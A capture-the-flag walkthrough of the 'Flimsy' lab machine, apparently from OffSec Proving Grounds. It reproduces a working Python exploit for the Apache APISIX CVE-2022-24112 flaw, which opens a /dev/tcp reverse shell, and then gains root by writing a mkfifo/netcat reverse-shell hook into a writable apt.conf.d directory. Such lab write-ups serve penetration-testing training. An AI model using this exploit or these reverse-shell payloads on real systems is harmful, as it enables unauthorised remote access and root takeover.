# Flimsy

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 7
Number of Flags: 2
Lab Description:
This lab demonstrates exploiting a Remote Code Execution (RCE) vulnerability in Apache APISIX 2.8 
(CVE-2022-24112) to bypass IP restrictions and achieve a reverse shell as the franklin user. 
Privilege escalation is performed by leveraging a writable apt configuration directory to inject 
a reverse shell payload into the cron-executed apt-get update command. This lab emphasizes API 
exploitation, cronjob abuse, and misconfigured package management for root access.
Released: 30 Aug 2022
```

Machine link: [https://portal.offsec.com/machine/flimsy-40299/overview/details](https://portal.offsec.com/machine/flimsy-40299/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ export TARGET_IP=192.168.219.220

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ sudo nmap -sC -sV -p- $TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 07:37 +0100
Nmap scan report for 192.168.219.220
Host is up (0.032s latency).
Not shown: 65377 filtered tcp ports (no-response), 153 filtered tcp ports (host-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp    open   http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Upright
3306/tcp  open   mysql      MySQL (unauthorized)
8080/tcp  closed http-proxy
43500/tcp open   http       OpenResty web app server
|_http-server-header: APISIX/2.8
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.99 seconds
```

We have four services running and available:

- OpenSSH 8.2p1 on port 22
- nginx 1.18.0 on port 80
- MySQL on port 3306
- OpenResty web app server on port 43500

### Check the web sites

Browsing manually to port 80 shows a homepage for the `Upright` company  

![Homepage on Flimsy](Images/Homepage_on_Flimsy.png)

Checking the links and buttons show minimal functionality.

Accessing the site on port 43500 with `curl` shows an error message in JSON-format

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ curl -v http://$TARGET_IP:43500               
*   Trying 192.168.219.220:43500...
* Established connection to 192.168.219.220 (192.168.219.220 port 43500) from 192.168.45.167 port 54728 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.219.220:43500
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 404 Not Found
< Date: Thu, 19 Mar 2026 06:46:20 GMT
< Content-Type: text/plain; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Server: APISIX/2.8
< 
{"error_msg":"404 Route Not Found"}
* Connection #0 to host 192.168.219.220:43500 left intact
```

From the server header we see that this is `APISIX` version 2.8.  
Googling for [more information](https://github.com/apache/apisix) we find:

```text
Apache APISIX is a dynamic, real-time, high-performance API Gateway.

APISIX API Gateway provides rich traffic management features such as load balancing, dynamic upstream, 
canary release, circuit breaking, authentication, observability, and more.

APISIX can serve as an AI Gateway through its flexible plugin system, providing AI proxying, load balancing 
for LLMs, retries and fallbacks, token-based rate limiting, and robust security to ensure the efficiency 
and reliability of AI agents. APISIX also provides the mcp-bridge plugin to seamlessly convert stdio-based 
MCP servers to scalable HTTP SSE services.
```

### Search for available exploits

Searching for an exploit with searchsploit turn up nothing

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ searchsploit apisix 2.8                                                         
Exploits: No Results
Shellcodes: No Results
```

but a Google search for `apache apisix 2.8 rce` gives us [this exploit](https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112):

```python
import requests
import sys


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]    
    

def banner():
    run = color_random[6]+'''\n                                   .     , 
        _.._ * __*\./ ___  _ \./._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| | 
          |                     |          
\n'''
    run2 = color_random[2]+'''\t\t(CVE-2022-24112)\n'''           
    run3 = color_random[4]+'''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
    print(run+run2+run3)    

if (len(sys.argv) != 4):
    banner()
    print("[!] Usage   : ./apisix-exploit.py <target_url> <lhost> <lport>")
    exit()
    
else:
    banner()
    target_url = sys.argv[1]  
    lhost = sys.argv[2]
    lport = sys.argv[3]
    
headers1 = {
    'Host': '127.0.0.1:8080',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Content-Length': '540',
    'Connection': 'close',
}

headers2 = {
    'Host': '127.0.0.1:8080',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Connection': 'close',
}

json_data = {
    'headers': {
        'X-Real-IP': '127.0.0.1',
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
        'Content-Type': 'application/json',
    },
    'timeout': 1500,
    'pipeline': [
        {
            'path': '/apisix/admin/routes/index',
            'method': 'PUT',
            'body': '{"uri":"/rms/fzxewh","upstream":{"type":"roundrobin","nodes":{"schmidt-schaefer.com":1}},"name":"wthtzv","filter_func":"function(vars) os.execute(\'bash -c \\\\\\"0<&160-;exec 160<>/dev/tcp/'+lhost+'/'+lport+';sh <&160 >&160 2>&160\\\\\\"\'); return true end"}',
        },
    ],
}

response1 = requests.post(target_url+'apisix/batch-requests', headers=headers1, json=json_data, verify=False)

response2 = requests.get(target_url+'rms/fzxewh', headers=headers2, verify=False) 
```

The exploit will give us a reverse shell on the supplied IP and port.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ python apisix-exploit.py                                           
/mnt/hgfs/OffSec_PG/PG_Practice/Easy/Flimsy/apisix-exploit.py:21: SyntaxWarning: invalid escape sequence '\.'
  _.._ * __*\./ ___  _ \./._ | _ *-+-

                                   .     ,                                                                                                                                                        
        _.._ * __*\./ ___  _ \./._ | _ *-+-                                                                                                                                                       
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |                                                                                                                                                        
          |                     |                                                                                                                                                                 
                                                                                                                                                                                                  
                (CVE-2022-24112)                                                                                                                                                                  
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }                                                                                                                                        
                                                                                                                                                                                                  
                                                                                                                                                                                                  
[!] Usage   : ./apisix-exploit.py <target_url> <lhost> <lport>     
```

### Get a reverse shell

We start a netcat listener on port 12345

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ nc -lvnp 12345    
listening on [any] 12345 ...

```

And execute the exploit

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ python apisix-exploit.py http://$TARGET_IP:43500/ 192.168.45.167 12345
/mnt/hgfs/OffSec_PG/PG_Practice/Easy/Flimsy/apisix-exploit.py:21: SyntaxWarning: invalid escape sequence '\.'
  _.._ * __*\./ ___  _ \./._ | _ *-+-

                                   .     ,                                                                                                                                                        
        _.._ * __*\./ ___  _ \./._ | _ *-+-                                                                                                                                                       
       (_][_)|_) |/'\     (/,/'\[_)|(_)| |                                                                                                                                                        
          |                     |                                                                                                                                                                 
                                                                                                                                                                                                  
                (CVE-2022-24112)                                                                                                                                                                  
{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }                                                                                                                                        
                                                                                                                                                                                                  

```

Checking back to the netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ nc -lvnp 12345    
listening on [any] 12345 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.219.220] 47618
id
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
hostname
flimsy
```

### Fix/upgrade the reverse shell

We don't have a proper shell though so let's fix that

```bash
which python3
/bin/python3
tty                                           
not a tty
python3 -c 'import pty;pty.spawn("/bin/bash")'
franklin@flimsy:/root$ ^Z
zsh: suspended  nc -lvnp 12345
                                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ stty raw -echo ; fg ; reset 
[1]  + continued  nc -lvnp 12345

franklin@flimsy:/root$ export SHELL=/bin/bash
franklin@flimsy:/root$ export TERM=xterm-256color
franklin@flimsy:/root$ stty rows 200 columns 200
franklin@flimsy:/root$ ^C
franklin@flimsy:/root$ 
```

Now we have a proper shell that survives `Ctrl + C`!

### Get the user flag

Now we can search for the user flag

```bash
franklin@flimsy:/root$ find / -type f -name local.txt 2>/dev/null
/home/franklin/local.txt
franklin@flimsy:/root$ cat /home/franklin/local.txt
0<REDACTED>7
franklin@flimsy:/root$ 
```

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

First we check for SUID files

```bash
franklin@flimsy:/root$ find / -type f -perm /4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/snap/core20/1581/usr/bin/chfn
/snap/core20/1581/usr/bin/chsh
/snap/core20/1581/usr/bin/gpasswd
/snap/core20/1581/usr/bin/mount
/snap/core20/1581/usr/bin/newgrp
/snap/core20/1581/usr/bin/passwd
/snap/core20/1581/usr/bin/su
/snap/core20/1581/usr/bin/sudo
/snap/core20/1581/usr/bin/umount
/snap/core20/1581/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1581/usr/lib/openssh/ssh-keysign
/snap/core20/1587/usr/bin/chfn
/snap/core20/1587/usr/bin/chsh
/snap/core20/1587/usr/bin/gpasswd
/snap/core20/1587/usr/bin/mount
/snap/core20/1587/usr/bin/newgrp
/snap/core20/1587/usr/bin/passwd
/snap/core20/1587/usr/bin/su
/snap/core20/1587/usr/bin/sudo
/snap/core20/1587/usr/bin/umount
/snap/core20/1587/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1587/usr/lib/openssh/ssh-keysign
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/snapd/16010/usr/lib/snapd/snap-confine
franklin@flimsy:/root$ 
```

Nothing that stands out.

Next, we check for capabilities

```bash
franklin@flimsy:/root$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1581/usr/bin/ping = cap_net_raw+ep
/snap/core20/1587/usr/bin/ping = cap_net_raw+ep
franklin@flimsy:/root$ 
```

Nothing of interest.

Continuing the enumeration, we find some custom jobs in the global crontab

```bash
franklin@flimsy:/home/franklin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root apt-get update
* * * * * root /root/run.sh
franklin@flimsy:/home/franklin$ ls -l /root/run.sh
ls: cannot access '/root/run.sh': Permission denied
franklin@flimsy:/home/franklin$ 
```

But the script isn't accessible to us.

However, checking the `apt` configuration, we have write access to the `/etc/apt/apt.conf.d/` directory

```bash
franklin@flimsy:/home/franklin$ ls -l /etc/apt
total 32
drwxrwxrwx 2 root root 4096 Aug 24  2022 apt.conf.d
drwxr-xr-x 2 root root 4096 Apr  9  2020 auth.conf.d
drwxr-xr-x 2 root root 4096 Apr  9  2020 preferences.d
-rw-r--r-- 1 root root 2717 Jun 15  2022 sources.list
-rw-r--r-- 1 root root 2743 Feb 23  2022 sources.list.curtin.old
drwxr-xr-x 2 root root 4096 Jun 30  2022 sources.list.d
-rw-r--r-- 1 root root 1188 Jun 30  2022 trusted.gpg
drwxr-xr-x 2 root root 4096 Jun 30  2022 trusted.gpg.d
franklin@flimsy:/home/franklin$ ls -l /etc/apt/apt.conf.d/
total 56
-rw-r--r-- 1 root root   92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root  630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root  129 May 14  2021 10periodic
-rw-r--r-- 1 root root  108 May 14  2021 15update-stamp
-rw-r--r-- 1 root root  604 Jan 20  2022 20apt-esm-hook.conf
-rw-r--r-- 1 root root   85 May 14  2021 20archive
-rw-r--r-- 1 root root   80 Jul 21  2020 20auto-upgrades
-rw-r--r-- 1 root root 1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root  114 Feb 15  2022 20snapd.conf
-rw-r--r-- 1 root root  625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root 5459 Jul 21  2020 50unattended-upgrades
-rw-r--r-- 1 root root  182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root  305 May 14  2021 99update-notifier
franklin@flimsy:/home/franklin$ 
```

But how can we exploit this?

### Create an exploit

Searching for inspiration, this [Hacking Article on APT Privilege Escalation](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/) was found.

First we create another netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ nc -lvnp 443                      
listening on [any] 443 ...

```

and then we create a malicious package configuration that spawns a reverse shell

```bash
franklin@flimsy:/home/franklin$ cd /etc/apt/apt.conf.d/
franklin@flimsy:/etc/apt/apt.conf.d$ echo 'APT::Update::Pre-Invoke {"rm /tmp/cajac;mkfifo /tmp/cajac;cat /tmp/cajac|/bin/bash -i 2>&1|nc 192.168.45.167 443 >/tmp/cajac"};' > 42privesc
franklin@flimsy:/etc/apt/apt.conf.d$ cat 42privesc 
APT::Update::Pre-Invoke {"rm /tmp/cajac;mkfifo /tmp/cajac;cat /tmp/cajac|/bin/bash -i 2>&1|nc 192.168.45.167 443 >/tmp/cajac"};
franklin@flimsy:/etc/apt/apt.conf.d$ 
```

Next, we wait a minute for the connection aminute or so

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Easy/Flimsy]
└─$ nc -lvnp 443                      
listening on [any] 443 ...

connect to [192.168.45.167] from (UNKNOWN) [192.168.219.220] 33340
bash: cannot set terminal process group (48510): Inappropriate ioctl for device
bash: no job control in this shell
root@flimsy:/tmp# 
root@flimsy:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@flimsy:/tmp# 
```

### Get the root flag

Finally we can get the root flag

```bash
root@flimsy:/tmp# cat /root/proof.txt
cat /root/proof.txt
3<REDACTED>f
root@flimsy:/tmp# 
```

For additional information, please see the references below.

## References

- [Apache APISIX API Gateway - GitHub](https://github.com/apache/apisix)
- [Apache APISIX Remote Code Execution (CVE-2022-24112) Exploit](https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112)
- [APT Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)
- [capabilities - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [cron - Wikipedia](https://en.wikipedia.org/wiki/Cron)
- [crontab(5) - Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [getcap - Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [hostname - Linux manual page](https://man7.org/linux/man-pages/man1/hostname.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [MySQL - Wikipedia](https://en.wikipedia.org/wiki/MySQL)
- [Nginx - Wikipedia](https://en.wikipedia.org/wiki/Nginx)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Reverse Shell Generator - Homepage](https://www.revshells.com/)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [stty - Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [tty - Linux manual page](https://man7.org/linux/man-pages/man1/tty.1.html)
